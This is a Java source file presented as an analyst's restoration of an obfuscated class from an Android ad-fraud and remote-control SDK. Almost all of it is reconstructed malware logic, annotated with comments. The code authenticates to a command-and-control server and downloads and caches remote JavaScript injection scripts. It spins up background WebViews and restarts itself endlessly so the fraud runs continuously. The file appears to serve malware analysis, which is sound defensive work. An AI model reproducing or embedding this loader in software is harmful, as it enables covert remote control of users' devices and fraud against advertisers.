package touch;

import android.content.Context;
import android.os.SystemClock;
import android.webkit.WebView;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: lIllIlIll1.IlIlllIIlI1
 *
 * Central task orchestrator for the ad-fraud / remote-control SDK.
 * Coordinates the entire task lifecycle:
 *
 * 1. Authenticates with the C&C server to obtain an auth token
 * 2. Determines whether to run in signaling (WebRTC) or non-signaling (autonomous) mode
 * 3. Downloads and caches JavaScript injection scripts from C&C
 * 4. Creates a WebView on the UI thread
 * 5. Dispatches the appropriate task implementation (SignalingModeTask or NonSignalingModeTask)
 * 6. After task completion, restarts the cycle with a new WebView
 *
 * JavaScript files are cached locally and version-checked against the server to avoid
 * re-downloading unchanged scripts. The JS version is stored in SharedPreferences.
 *
 * Original obfuscated name: lIllIlIll1.IlIlllIIlI1
 *
 * Dependencies (obfuscated → restored):
 *   IlIlIIIlIlIlll1.IIlIllIIll1         → AppContext / PreferencesHelper
 *   IlIllIlllIllI1.llllIIIIll1            → ApiClient (HTTP API)
 *   IlIllIlllIllI1.lIIIIlllllIlll1        → NetworkException
 *   IIlIllIIll1.llllIIIIll1               → ApiException(name, code, message)
 *   lIllIIIlIl1.IIlIllIIll1               → TokenResponse
 *   lIllIIIlIl1.lIllIlIll1                → ConfigResponse
 *   lIllIIIlIl1.llllllIlIIIlll1           → FileVersionResponse (signaling JS)
 *   lIllIIIlIl1.IllIIlIIII1               → FileInfoResponse (non-signaling JS info)
 *   lIllIIIlIl1.IlIlllIIlI1               → FileContentResponse (non-signaling JS content)
 *   lllllIllIl1.IllIIlIIII1               → LogHelper
 */
public class TaskOrchestrator {

    private static final String TAG = "TaskOrchestrator";

    // =========================================================================
    // Static Constants (XOR-decrypted from static initializer)
    // =========================================================================

    /**
     * SharedPreferences key for tracking the JS version.
     * Used to check if cached JS matches the server version, avoiding redundant downloads.
     * Decrypted from: f464llllIIIIll1 (line 114)
     */
    public static final String JS_VERSION_KEY = "JS_VERSION";

    /**
     * Alternate JS version key (identical value, different field).
     * Decrypted from: f463lIIIIlllllIlll1 (line 115)
     */
    public static final String JS_VERSION_KEY_ALT = "JS_VERSION";

    /**
     * SharedPreferences key for caching the non-signaling JS file content.
     * Decrypted from: f465llllIllIl1 (line 116)
     */
    public static final String NON_SIGNALING_JS_FILE_KEY = "eiedo/pfile";

    /**
     * SharedPreferences key for caching the signaling JS file content.
     * Decrypted from: f462IllIIlIIII1 (line 117)
     */
    public static final String SIGNALING_JS_FILE_KEY = "eiedo/s_pfile";

    // =========================================================================
    // Inner Classes
    // =========================================================================

    /**
     * Runnable that creates a new WebView instance on the UI thread.
     * The WebView is stored in a single-element array for thread-safe return.
     *
     * Original obfuscated name: lIIIIlllllIlll1
     */
    public class CreateWebViewRunnable implements Runnable {

        public final WebView[] webViewHolder;

        public CreateWebViewRunnable(WebView[] webViewHolder) {
            this.webViewHolder = webViewHolder;
        }

        @Override
        public void run() {
            // Original: if (IIlIllIIll1.f145lIllIlIll1 != null) {
            //     this.f467llllIIIIll1[0] = new WebView(IIlIllIIll1.f145lIllIlIll1);
            // }
            Context appContext = AppContext.applicationContext;
            if (appContext != null) {
                this.webViewHolder[0] = new WebView(appContext);
            }
        }
    }

    /**
     * Main task execution runnable. Runs on a background thread and orchestrates:
     * 1. Authentication with C&C
     * 2. Mode determination (signaling vs non-signaling)
     * 3. JS download/cache check
     * 4. Task config download
     * 5. Task instantiation and initialization on UI thread
     *
     * Original obfuscated name: llllIIIIll1
     */
    public class TaskExecutionRunnable implements Runnable {

        public final WebView webView;

        /**
         * Runnable that initializes the WebView on the UI thread.
         * Calls task.initializeWebView() which configures WebSettings,
         * injects the JS bridge, and loads the target URL.
         *
         * Original obfuscated name: lIIIIlllllIlll1 (inner)
         */
        public class InitWebViewRunnable implements Runnable {

            public final WebViewAutomationBase taskInstance;

            public InitWebViewRunnable(WebViewAutomationBase taskInstance) {
                this.taskInstance = taskInstance;
            }

            @Override
            public void run() {
                try {
                    // Original: this.f471llllIIIIll1.lIllIIIlIl1();
                    this.taskInstance.initializeWebView();
                } catch (Exception e) {
                    LogHelper.log(LogLevel.ERROR, "", "Error while starting adHolder: " + e);
                }
            }
        }

        /**
         * Restart callback for NonSignalingModeTask.
         * When a non-signaling task completes, this triggers a new task cycle.
         *
         * Original obfuscated name: RunnableC0018llllIIIIll1
         */
        public class RestartRunnable implements Runnable {
            public RestartRunnable() {
            }

            @Override
            public void run() {
                TaskOrchestrator.this.restartWithNewWebView();
            }
        }

        public TaskExecutionRunnable(WebView webView) {
            this.webView = webView;
        }

        @Override
        public void run() {
            try {
                LogHelper.log(LogLevel.INFO, "", "start task");

                // Step 1: Authenticate with C&C server
                TaskOrchestrator.this.authenticateToken();

                // Step 2: Determine signaling vs non-signaling mode
                boolean isSignalingMode = AppContext.taskConfig.isSignalingMode();

                // Step 3: Download/cache appropriate JS script
                String jsScript = isSignalingMode
                        ? TaskOrchestrator.this.getSignalingJS()
                        : TaskOrchestrator.this.getNonSignalingJS();

                // Step 4: Get task configuration from C&C
                JSONObject taskConfig = isSignalingMode
                        ? TaskOrchestrator.this.getSignalingConfig()
                        : TaskOrchestrator.this.getNonSignalingConfig();

                LogHelper.log(LogLevel.INFO, "", "get task: " + taskConfig);

                // Step 5: Create appropriate task and initialize on UI thread
                WebViewAutomationBase task;
                if (isSignalingMode) {
                    task = new SignalingModeTask(this.webView, taskConfig, jsScript);
                } else {
                    task = new NonSignalingModeTask(this.webView, taskConfig, jsScript,
                            new RestartRunnable());
                }

                // Post WebView initialization to the main thread
                AppContext.postToMainThread(new InitWebViewRunnable(task));

            } catch (ApiException e) {
                // API-level errors (auth failure, config fetch failure, etc.)
                LogHelper.log(LogLevel.WARN, "", e.getMessage());
            } catch (Exception e2) {
                // General errors
                LogHelper.log(LogLevel.WARN, "", "start task failed: " + e2);
            } catch (Throwable th) {
                // Catastrophic errors — log full stack trace for remote debugging
                StringBuilder sb = new StringBuilder();
                for (StackTraceElement element : th.getStackTrace()) {
                    sb.append(element.toString()).append("\n");
                }
                LogHelper.log(LogLevel.ERROR, "", "恶性异常2" + th.getMessage() + sb.toString());
            }
        }
    }

    // =========================================================================
    // Constructor
    // =========================================================================

    /**
     * Constructs a TaskOrchestrator.
     * Sets the WebView data directory suffix to an encoded token, ensuring WebView
     * storage is isolated from the host application's data.
     *
     * The suffix is a Base64-encoded identifier:
     * "ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI="
     *
     * Original: IlIllIlllIllI1.lIIIIlllllIlll1.llllIIIIll1(decryptedSuffix)
     *           → AppContext.setDataDirectorySuffix(suffix)
     */
    public TaskOrchestrator() {
        AppContext.setDataDirectorySuffix("ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI=");
    }

    // =========================================================================
    // Authentication
    // =========================================================================

    /**
     * Authenticates with the C&C server to obtain an authorization token.
     *
     * Flow:
     * 1. Call ApiClient.getToken()
     * 2. On success (code==0): store the token in AppContext.authToken
     * 3. On failure: throw ApiException with the server's error code and message
     * 4. On null response or network error: throw ApiException with code -1
     *
     * @throws ApiException if authentication fails
     */
    public final void authenticateToken() throws ApiException {
        LogHelper.log(LogLevel.INFO, "", "get token");

        Object /* TokenResponse */ tokenResponse = null;
        try {
            tokenResponse = ApiClient.getToken();
        } catch (NetworkException e) {
            LogHelper.log(LogLevel.ERROR, "", "api getToken error: " + e);
        }

        if (tokenResponse == null) {
            throw new ApiException("getToken", -1, "response null");
        }

        int code = tokenResponse.getCode();
        if (code == 0) {
            // Success: store the auth token for subsequent API calls
            AppContext.authToken = tokenResponse.getData();
        } else {
            throw new ApiException("getToken", code, tokenResponse.getMessage());
        }
    }

    // =========================================================================
    // Signaling Connection Info
    // =========================================================================

    /**
     * Returns the current signaling connection info from the AppContext.
     * Used by other components to access WebRTC signaling state.
     *
     * Original: return IlIlllIIlI1.lIIIIlllllIlll1.IlIllIlllIllI1();
     */
    public static Object /* SignalingConnection */ getSignalingConnectionInfo() {
        return AppContext.getSignalingConnection();
    }

    // =========================================================================
    // Task Configuration
    // =========================================================================

    /**
     * Gets the non-signaling task configuration from the C&C server.
     *
     * @return task configuration as a JSONObject
     * @throws ApiException if the API call fails or returns a non-zero code
     */
    public final JSONObject getNonSignalingConfig() throws ApiException, JSONException {
        Object /* ConfigResponse */ response = null;
        try {
            response = ApiClient.getNonSignalingConfig();
        } catch (NetworkException e) {
            LogHelper.log(LogLevel.ERROR, "", "api getTask error: " + e);
        }

        if (response == null) {
            throw new ApiException("getTask", -1, "response null");
        }

        int code = response.getCode();
        if (code == 0) {
            return new JSONObject(response.getData());
        }
        throw new ApiException("getTask", code, response.getMessage());
    }

    /**
     * Gets the signaling task configuration from the C&C server.
     * Includes the signaling session ID and offer ID as parameters.
     *
     * @return task configuration as a JSONObject
     * @throws ApiException if the API call fails or returns a non-zero code
     */
    public final JSONObject getSignalingConfig() throws ApiException, JSONException {
        Object /* ConfigResponse */ response = null;
        try {
            // Pass the current signaling session ID and the configured offer ID
            response = ApiClient.getSignalingConfig(
                    AppContext.getSignalingConnection().getSessionId(),
                    AppContext.taskConfig.getOfferId());
        } catch (NetworkException e) {
            LogHelper.log(LogLevel.ERROR, "", "api getSignalingTask error: " + e);
        }

        if (response == null) {
            throw new ApiException("getSignalingTask", -1, "response null");
        }

        int code = response.getCode();
        if (code == 0) {
            return new JSONObject(response.getData());
        }
        throw new ApiException("getSignalingTask", code, response.getMessage());
    }

    // =========================================================================
    // JavaScript Download & Caching
    // =========================================================================

    /**
     * Downloads or retrieves from cache the signaling-mode JavaScript injection script.
     *
     * Caching logic:
     * 1. Read cached JS version from SharedPreferences (key: JS_VERSION_KEY)
     * 2. Compute auth token via PreferencesHelper
     * 3. Call C&C API getFileSignalingLogic(token) to get version + content
     * 4. If server version matches cached AND local JS file exists → use cache
     * 5. If mismatch OR no cache → save new JS to file, update version preference
     *
     * @return the JavaScript code string for signaling mode
     * @throws ApiException if download fails and no cache is available
     */
    public final String getSignalingJS() throws ApiException {
        LogHelper.log(LogLevel.INFO, "", "checkSignalingJsVersion start");

        Context context = AppContext.taskConfig.getContext();

        // Read cached JS version from SharedPreferences
        String cachedVersion = PreferencesHelper.readPref(context, JS_VERSION_KEY);

        // Compute auth token for the file API call
        String token = PreferencesHelper.computeToken(
                AppContext.taskConfig.getApiKey(), JS_VERSION_KEY);
        LogHelper.log(LogLevel.INFO, "", "已存在的版本是: " + token);

        // Query server for current signaling JS version + content
        Object /* FileVersionResponse */ versionResponse = null;
        try {
            versionResponse = ApiClient.getFileSignalingLogic(
                    token != null ? token : "");
        } catch (NetworkException e) {
            LogHelper.log(LogLevel.ERROR, "",
                    "api getFileSignalingLogic error: " + e);
        }

        if (versionResponse == null) {
            throw new ApiException("getFileVersion", -1, "response null");
        }

        int code = versionResponse.getCode();
        if (code != 0) {
            throw new ApiException("getFileSignalingLogic",
                    code, versionResponse.getMessage());
        }

        // Try to read locally-cached JS file
        String cachedJS = null;
        try {
            cachedJS = PreferencesHelper.readFile(context, SIGNALING_JS_FILE_KEY);
        } catch (Exception e) {
            LogHelper.log(LogLevel.ERROR, "",
                    "Error while reading encrypted file: " + e);
        }

        // Determine if we need to use the downloaded version
        String serverVersion = versionResponse.getVersion();
        String serverContent = versionResponse.getContent();

        if (cachedVersion == null || cachedVersion.isEmpty()
                || !cachedVersion.equals(serverVersion)
                || cachedJS == null || cachedJS.isEmpty()) {
            // Cache miss or version mismatch — save new JS content
            if (!PreferencesHelper.writeFile(context, SIGNALING_JS_FILE_KEY, serverContent)) {
                throw new RuntimeException("写入JS文件失败");
            }
            // Update the cached version in SharedPreferences
            PreferencesHelper.savePref(context, JS_VERSION_KEY, serverVersion);
            cachedJS = serverContent;
        }

        if (cachedJS != null && cachedJS.isEmpty()) {
            LogHelper.log(LogLevel.ERROR, "", "js is empty");
        }

        return cachedJS;
    }

    /**
     * Downloads or retrieves from cache the non-signaling-mode JavaScript injection script.
     *
     * This is a two-step process unlike signaling mode:
     * 1. First call getNonSignalingJSInfo() to check if an update is needed
     * 2. If update needed, call getFile() to download the actual JS content
     *
     * Caching logic:
     * 1. Call C&C API getNonSignalingJSInfo() to get version info
     * 2. Read cached version from SharedPreferences
     * 3. Try to read cached JS from local file
     * 4. If versions match AND cached file exists → use cache
     * 5. If mismatch OR no cache:
     *    a. Log "开始下载js" (starting JS download)
     *    b. Call C&C API getFile() to download new JS
     *    c. Save to local file and update version preference
     *
     * @return the JavaScript code string for non-signaling mode
     * @throws ApiException if download fails and no cache is available
     */
    public final String getNonSignalingJS() throws ApiException {
        LogHelper.log(LogLevel.INFO, "", "checkJsVersion start");

        // Step 1: Query server for current non-signaling JS info
        Object /* FileInfoResponse */ fileInfoResponse = null;
        try {
            fileInfoResponse = ApiClient.getNonSignalingJSInfo();
        } catch (NetworkException e) {
            LogHelper.log(LogLevel.ERROR, "", "api done error: " + e);
        }

        if (fileInfoResponse == null) {
            throw new ApiException("getFileVersion", -1, "response null");
        }

        int code = fileInfoResponse.getCode();
        if (code != 0) {
            throw new ApiException("getFileVersion",
                    code, fileInfoResponse.getMessage());
        }

        // Read cached version from SharedPreferences
        Context context = AppContext.taskConfig.getContext();
        String cachedVersion = PreferencesHelper.readPref(context, JS_VERSION_KEY);
        LogHelper.log(LogLevel.INFO, "", "已存在的版本是: " + cachedVersion);

        // Try to read locally-cached JS file
        String cachedJS = null;
        try {
            cachedJS = PreferencesHelper.readFile(context, NON_SIGNALING_JS_FILE_KEY);
        } catch (Exception e) {
            LogHelper.log(LogLevel.ERROR, "",
                    "Error while reading encrypted file: " + e);
        }

        String serverVersion = fileInfoResponse.getVersion();

        // Check if we need to download fresh JS
        if (cachedVersion == null || cachedVersion.isEmpty()
                || !cachedVersion.equals(serverVersion)
                || cachedJS == null || cachedJS.isEmpty()) {

            // Cache miss or version mismatch — need to download
            LogHelper.log(LogLevel.INFO, "", "开始下载js");

            // Step 2: Download the actual JS file content
            Object /* FileContentResponse */ fileResponse = null;
            try {
                fileResponse = ApiClient.getFile();
            } catch (NetworkException e) {
                LogHelper.log(LogLevel.ERROR, "", "api getFile error: " + e);
            }

            if (fileResponse != null) {
                int fileCode = fileResponse.getCode();
                if (fileCode == 0) {
                    String jsContent = fileResponse.getContent();

                    // Save to local file
                    if (!PreferencesHelper.writeFile(
                            context, NON_SIGNALING_JS_FILE_KEY, jsContent)) {
                        throw new RuntimeException("写入JS文件失败");
                    }

                    // Update cached version in SharedPreferences
                    PreferencesHelper.savePref(context, JS_VERSION_KEY, serverVersion);
                    cachedJS = jsContent;
                } else {
                    throw new ApiException("getFile",
                            fileCode, fileResponse.getMessage());
                }
            } else {
                throw new ApiException("getFile", -1, "response null");
            }
        }

        if (cachedJS != null && cachedJS.isEmpty()) {
            LogHelper.log(LogLevel.ERROR, "", "js is empty");
        }

        return cachedJS;
    }

    // =========================================================================
    // Task Lifecycle
    // =========================================================================

    /**
     * Starts the task execution on a new background thread.
     *
     * Original: new Thread(new llllIIIIll1(webView)).start();
     *
     * @param webView the WebView to use for this task
     */
    public void startTask(WebView webView) {
        new Thread(new TaskExecutionRunnable(webView)).start();
    }

    /**
     * Creates a new WebView on the UI thread and starts a new task cycle.
     *
     * This method implements the continuous restart mechanism:
     * 1. Creates a WebView on the UI thread via CreateWebViewRunnable
     * 2. Sleeps 2 seconds to allow initialization
     * 3. Creates a new TaskOrchestrator instance
     * 4. Starts a new task with the freshly created WebView
     *
     * Called by NonSignalingModeTask's RestartRunnable after each task completes,
     * enabling continuous autonomous ad-fraud operation in a loop.
     */
    public final void restartWithNewWebView() {
        try {
            WebView[] webViewHolder = new WebView[1];

            // Create WebView on UI thread
            AppContext.postToMainThread(new CreateWebViewRunnable(webViewHolder));

            // Wait 2 seconds for WebView initialization
            SystemClock.sleep(2000L);

            // Create a fresh orchestrator and start a new task
            TaskOrchestrator orchestrator = new TaskOrchestrator();
            LogHelper.log(LogLevel.INFO, "", "H5V1Refactor task start");

            WebView webView = webViewHolder[0];
            if (webView != null) {
                orchestrator.startTask(webView);
            }
        } catch (Exception unused) {
            // Silently ignore restart failures to avoid breaking the loop
        }
    }

    // =========================================================================
    // Placeholder types for unrestored dependencies
    // (These represent real classes in the obfuscated APK that have not been
    //  individually restored. The type names below document their role.)
    // =========================================================================

    /*
     * The following are stub references to external classes used by this orchestrator.
     * In the actual APK, these are:
     *
     * AppContext (IlIlIIIlIlIlll1.IIlIllIIll1):
     *   - static Context applicationContext
     *   - static String authToken
     *   - static TaskConfig taskConfig
     *   - static void postToMainThread(Runnable)
     *   - static void setDataDirectorySuffix(String)
     *   - static SignalingConnection getSignalingConnection()
     *
     * PreferencesHelper (IlIlIIIlIlIlll1.IIlIllIIll1):
     *   - static String readPref(Context, String key)
     *   - static void savePref(Context, String key, String value)
     *   - static String readFile(Context, String fileKey)
     *   - static boolean writeFile(Context, String fileKey, String content)
     *   - static String computeToken(String apiKey, String versionKey)
     *
     * ApiClient (IlIllIlllIllI1.llllIIIIll1):
     *   - static TokenResponse getToken() throws NetworkException
     *   - static ConfigResponse getNonSignalingConfig() throws NetworkException
     *   - static ConfigResponse getSignalingConfig(String sessionId, String offerId) throws NetworkException
     *   - static FileVersionResponse getFileSignalingLogic(String token) throws NetworkException
     *   - static FileInfoResponse getNonSignalingJSInfo() throws NetworkException
     *   - static FileContentResponse getFile() throws NetworkException
     *
     * ApiException (IIlIllIIll1.llllIIIIll1):
     *   - Constructor: ApiException(String name, int code, String message)
     *
     * NetworkException (IlIllIlllIllI1.lIIIIlllllIlll1.llllIIIIll1):
     *   - Thrown on HTTP/network failures
     *
     * LogHelper (lllllIllIl1.IllIIlIIII1):
     *   - static void log(LogLevel level, String tag, String message)
     *
     * LogLevel (c13.nim5.ez8.h5_proto.Log.LogLevel):
     *   - INFO, WARN, ERROR
     *
     * Response types (from lIllIIIlIl1 package):
     *   TokenResponse:       getCode(), getData(), getMessage()
     *   ConfigResponse:      getCode(), getData(), getMessage()
     *   FileVersionResponse: getCode(), getVersion(), getContent(), getMessage()
     *   FileInfoResponse:    getCode(), getVersion(), getMessage()
     *   FileContentResponse: getCode(), getContent(), getMessage()
     */
}
